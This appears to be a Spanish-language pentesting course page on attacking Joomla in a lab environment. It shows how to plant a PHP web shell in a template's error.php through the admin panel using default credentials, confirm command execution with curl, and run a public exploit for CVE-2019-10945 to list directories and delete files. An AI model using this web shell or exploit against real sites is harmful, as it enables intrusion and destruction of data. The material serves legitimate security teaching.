Ahora sabemos que estamos lidiando con un sitio de Joomla e-commerce. Si logramos obtener acceso, podríamos infiltrarnos en el entorno interno del cliente y comenzar a enumerar el entorno de dominio interno. Al igual que WordPress y Drupal, Joomla ha tenido su buena cantidad de vulnerabilidades tanto en la aplicación principal como en extensiones vulnerables. Además, al igual que los otros, es posible obtener ejecución remota de código (RCE) si podemos iniciar sesión en el backend de administración.

---

## Abusing Built-In Functionality

Durante la fase de enumeración de Joomla y la investigación general en busca de datos de la empresa, podríamos encontrar credenciales filtradas que podemos usar para nuestros propósitos. Usando las credenciales que obtuvimos en los ejemplos de la última sección, `admin:admin`, iniciemos sesión en el backend objetivo en `http://dev.inlanefreight.local/administrator`. Una vez dentro, veremos muchas opciones disponibles. Para nuestros propósitos, nos gustaría agregar un fragmento de código PHP para obtener RCE. Podemos hacer esto personalizando una plantilla.

`http://dev.inlanefreight.local/administrator/index.php`

![joomla_admin](https://academy.hackthebox.com/storage/modules/113/joomla_admin.png)

Desde aquí, podemos hacer clic en `Templates` en la parte inferior izquierda, bajo `Configuration`, para abrir el menú de plantillas.

`http://dev.inlanefreight.local/administrator/index.php?option=com_templates`

![joomla_templates](https://academy.hackthebox.com/storage/modules/113/joomla_templates.png)

Luego, podemos hacer clic en un nombre de plantilla. Vamos a elegir `protostar` bajo la columna `Template`. Esto nos llevará a la página `Templates: Customise`.

`http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506`

![joomla_customise](https://academy.hackthebox.com/storage/modules/113/joomla_customise.png)

Finalmente, podemos hacer clic en una página para abrir el código fuente de la página. Es una buena idea acostumbrarse a usar nombres de archivos y parámetros no estándar para nuestras web shells, para que no sean fácilmente accesibles para un atacante durante la evaluación. También podemos proteger con contraseña y limitar el acceso a nuestra dirección IP de origen. Además, siempre debemos recordar limpiar las web shells tan pronto como hayamos terminado con ellas, pero aún así incluir el nombre del archivo, el hash del archivo y la ubicación en nuestro informe final al cliente.

Vamos a elegir la página `error.php`. Agregaremos una línea de código PHP para obtener ejecución de código de la siguiente manera:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

`http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D`

![joomla_edited](https://academy.hackthebox.com/storage/modules/113/joomla_edited.png)

Una vez hecho esto, haz clic en `Save & Close` en la parte superior y confirma la ejecución de código usando `cURL`.

```sh
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Desde aquí, podemos actualizar a una shell inversa interactiva y comenzar a buscar vectores de escalada de privilegios locales o centrarnos en el movimiento lateral dentro de la red corporativa. Debemos asegurarnos, una vez más, de anotar este cambio para los anexos de nuestro informe y hacer todo lo posible para eliminar el fragmento de PHP de la página `error.php`.

---

## Leveraging Known Vulnerabilities

En el momento de escribir esto, ha habido [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) vulnerabilidades relacionadas con Joomla que recibieron CVEs. Sin embargo, solo porque se haya divulgado una vulnerabilidad y haya recibido un CVE no significa que sea explotable o que haya un exploit público funcional disponible. Al igual que con WordPress, las vulnerabilidades críticas (como las de ejecución remota de código) que afectan el núcleo de Joomla son raras. Al buscar en un sitio como `exploit-db`, encontramos más de 1,400 entradas para Joomla, siendo la gran mayoría para extensiones de Joomla.

Vamos a profundizar en una vulnerabilidad del núcleo de Joomla que afecta la versión `3.9.4`, que se encontró que nuestra objetivo `http://dev.inlanefreight.local/` estaba ejecutando durante nuestra enumeración. Al revisar la página de [descargas](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html) de Joomla, podemos ver que `3.9.4` fue lanzado en marzo de 2019. Aunque está desactualizado ya que estamos en Joomla `4.0.3` a partir de septiembre de 2021, es completamente posible encontrarse con esta versión durante una evaluación, especialmente contra una gran empresa que puede no mantener un inventario de aplicaciones adecuado y no está al tanto de su existencia.

Investigando un poco, encontramos que esta versión de Joomla probablemente es vulnerable a [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945), que es una vulnerabilidad de recorrido de directorios y eliminación de archivos autenticada. Podemos usar [este](https://www.exploit-db.com/exploits/46710) script de exploit para aprovechar la vulnerabilidad y listar el contenido del directorio webroot y otros directorios. La versión en python3 de este mismo script se puede encontrar [aquí](https://github.com/dpgg101/CVE-2019-10945). También podemos usarlo para eliminar archivos (no recomendado). Esto podría llevar al acceso a archivos sensibles como un archivo de configuración o un script que contenga credenciales si luego podemos acceder a él a través de la URL de la aplicación. Un atacante también podría causar daño eliminando archivos necesarios si el usuario del servidor web tiene los permisos adecuados.

Podemos ejecutar el script especificando las flags `--url`, `--username`, `--password` y `--dir`. Como pentesters, esto solo nos sería útil si el portal de inicio de sesión del administrador no es accesible desde el exterior, ya que, armados con credenciales de administrador, podemos obtener ejecución remota de código, como vimos anteriormente.

```sh
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal & Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

---

## Moving On

Next, let's take a look at Drupal, which, while it holds a much smaller share of the CMS market, is still used by companies worldwide.